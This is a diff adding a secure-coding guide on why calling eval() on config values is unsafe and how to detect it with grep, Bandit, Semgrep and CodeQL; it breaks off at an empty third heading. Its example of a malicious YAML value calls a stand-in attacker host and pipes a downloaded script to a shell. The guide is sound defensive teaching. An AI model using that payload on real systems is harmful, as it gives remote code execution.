@@ -1,0 +1,80 @@
+# Why `eval()` on Config Fields Is Unsafe
+
+## The Core Problem
+
+`eval()` executes arbitrary code passed as a string. When that string originates from a config field, you've created a path where **data becomes executable code**. Config files are often treated as "trusted," but they frequently aren't:
+
+- They may be writable by lower-privileged users
+- They can be sourced from environment variables, remote services, or user uploads
+- They pass through deployment pipelines, templating engines, and shared repos
+
+If an attacker controls that value, they control code execution in your process.
+
+## Concrete Attack Example
+
+```python
+import yaml
+
+config = yaml.safe_load(open("config.yml"))
+timeout = eval(config["retry_delay"])   # UNSAFE
+```
+
+A benign config:
+```yaml
+retry_delay: "5 * 2"
+```
+
+A malicious config:
+```yaml
+retry_delay: "__import__('os').system('curl attacker.com/x.sh | sh')"
+```
+
+The second value results in remote code execution (RCE) with the privileges of your application.
+
+## Why It's Worse Than It Looks
+
+- **Full language access**: `eval` exposes builtins, imports, filesystem, network, and subprocess capabilities.
+- **Blast radius**: runs with your app's identity — DB credentials, cloud IAM roles, secrets in memory.
+- **Bypasses input validation elsewhere**: even if you sanitize user-facing inputs, the config path may be unreviewed.
+- **`ast.literal_eval` confusion**: developers sometimes think `eval` is fine "because it's just parsing a number." It never is.
+
+---
+
+# How to Detect It
+
+## 1. Static grep / pattern search (fast first pass)
+
+```bash
+grep -rnE '\beval\s*\(' --include='*.py' .
+grep -rnE '\bexec\s*\(' --include='*.py' .
+```
+
+Also flag related sinks:
+- Python: `eval`, `exec`, `compile`, `pickle.loads`, `yaml.load` (unsafe loader), `subprocess(..., shell=True)`
+- JavaScript: `eval`, `new Function()`, `setTimeout("string")`, `vm.runInThisContext`
+- Ruby: `eval`, `instance_eval`, `send`
+
+## 2. Static Analysis / Linters (better signal)
+
+- **Bandit** (Python): flags `B307` (eval) and `B102` (exec).
+  ```bash
+  bandit -r . -ll
+  ```
+- **Semgrep** with a taint rule that tracks config → eval:
+  ```yaml
+  rules:
+    - id: eval-on-config
+      mode: taint
+      pattern-sources:
+        - pattern: config[...]
+        - pattern: os.environ[...]
+      pattern-sinks:
+        - pattern: eval(...)
+        - pattern: exec(...)
+      message: Untrusted config value flows into eval()/exec()
+      severity: ERROR
+      languages: [python]
+  ```
+- **CodeQL** for dataflow/taint tracking from config sources to eval sinks.
+
+## 3.
